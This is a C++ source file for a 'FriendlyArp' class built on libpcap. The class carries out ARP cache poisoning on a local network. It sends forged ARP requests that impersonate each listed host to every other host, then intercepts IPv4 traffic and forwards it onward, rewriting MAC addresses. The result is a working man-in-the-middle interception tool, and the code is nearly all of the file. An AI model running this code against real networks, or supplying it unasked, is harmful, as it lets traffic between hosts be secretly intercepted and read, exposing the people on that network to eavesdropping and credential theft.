#include <iostream>

#include "FriendlyArp.hpp"
#include "Ethernet.hpp"
#include "ARP.hpp"
#include "IPv4.hpp"
#include "CliHelper.hpp"
#include "NetworkHelper.hpp"


const int MIN_IP_FRAME = 34;

FriendlyArp::FriendlyArp(   const std::map<uint32_t, MacAddress>& arp_mapper, 
                            pcap_t* handle,
                            const NetworkContext& net_ctx) : 
                            arp_cache(arp_mapper), 
                            pcap_handle(handle),
                            local_mac(net_ctx.local_mac), 
                            gateway_mac(net_ctx.gateway_mac),
                            local_ip(net_ctx.local_ip),
                            subnet_mask(ntohl(net_ctx.subnet_mask))
{ }

void FriendlyArp::send_arp_injections(std::vector<uint32_t> ip_addrs)
{
    for (uint32_t ip_addr_1 : ip_addrs)
    {
        for (uint32_t ip_addr_2 : ip_addrs)
        {
            if (ip_addr_1 != ip_addr_2)
            {
                auto entry = arp_cache.find(ip_addr_2);
                if (entry == arp_cache.end()) 
                    continue;

                MacAddress target_mac = entry->second;

                if (!injected_flag)
                {
                    std::cout << "Sending Gratuitous ARP to " << CliHelper::ip_to_string(ip_addr_2) 
                              << " impersonating " << CliHelper::ip_to_string(ip_addr_1) 
                              << " at " << CliHelper::mac_to_string(target_mac) << std::endl;
                }

                send_arp_injection(ip_addr_1, target_mac, ip_addr_2);
            }
        }
    }
    injected_flag = true;
}

void FriendlyArp::send_arp_injection(   const uint32_t& impersonate_src_ip, const MacAddress& target_mac, 
                                        const uint32_t& target_ip)
{
    std::vector<uint8_t> arp_poisoning;
    ARP::build_arp(arp_poisoning, &local_mac, &impersonate_src_ip,
                    &target_mac, &target_ip, ARP::Opcode::Request);
    
    Ethernet::build_ethernet(arp_poisoning, local_mac, target_mac, 0x0806);
    
    if (pcap_sendpacket(pcap_handle, arp_poisoning.data(), arp_poisoning.size()) != 0) 
    {
        std::cerr << "Failed to send gratuitous ARP: " << pcap_geterr(pcap_handle) << std::endl;
        return;
    }

    return;
}

void FriendlyArp::forward_packet(const struct pcap_pkthdr* header, const uint8_t* packet)
{
    if (header->caplen < MIN_IP_FRAME) 
        return; 

    uint32_t dest_ip;
    std::memcpy(&dest_ip, packet + 30, sizeof(dest_ip));

    uint16_t ethertype = ntohs(*(uint16_t*)(packet + 12));

    if (ethertype == static_cast<uint16_t>(Ethernet::Ethertype::IPv4))
    {
        IPv4 ip_parser(packet + ETHER_HDR_LEN);

        uint16_t ip_total_length = ip_parser.get_payload_length() + sizeof(IPv4Header); 
        size_t true_frame_size = ETHER_HDR_LEN + ip_total_length;
        

        if (true_frame_size > 1514) 
        {
            true_frame_size = 1514; 
        }
        
        if (true_frame_size > header->caplen) {
            true_frame_size = header->caplen;
        }

        // Allocate the buffer using the validated wire size
        std::vector<uint8_t> forward_buffer(packet, packet + true_frame_size);

        uint32_t src_ip  = ntohl(ip_parser.get_src_ip_raw());
        uint32_t dest_ip = ntohl(ip_parser.get_dest_ip_raw());
        MacAddress real_dest_mac;

        //* if outbound
        if ((dest_ip & subnet_mask) != (local_ip & subnet_mask))
        {
            real_dest_mac = gateway_mac;
            /*std::cout << "... IPv4 " << CliHelper::ip_to_string(dest_ip) 
                      << " isn't in the local network... Passing to gateway at " 
                      << CliHelper::mac_to_string(gateway_mac) << std::endl;

            std::cout << "\t[DEBUG] dest_ip: " << CliHelper::ip_to_string(dest_ip) << std::endl
                      << "\tsubnet_mask    : " << CliHelper::ip_to_string(subnet_mask) << std::endl
                      << "\tlocal_ip       : " << CliHelper::ip_to_string(local_ip) << std::endl << std::endl;*/
        }
        else
        {
            auto it = arp_cache.find(dest_ip);
            if (it == arp_cache.end())
            {
                //#std::cout << "Not forwarding, IPv4 " << CliHelper::ip_to_string(dest_ip) << " isn't in arp cache" << std::endl;
                return; 
            }    
            real_dest_mac = it->second;
        }

        //#std::vector<uint8_t> forward_buffer(packet, packet + header->caplen);

        std::memcpy(forward_buffer.data(), real_dest_mac.data(), ETHER_ADDR_LEN);               //* destination mac
        std::memcpy(forward_buffer.data() + ETHER_ADDR_LEN, local_mac.data(), ETHER_ADDR_LEN);  //* source mac

        if (pcap_sendpacket(pcap_handle, forward_buffer.data(), forward_buffer.size()) != 0)
        {
            std::cerr << "Failed to forward packet: " << pcap_geterr(pcap_handle) << std::endl;
        }
    }
}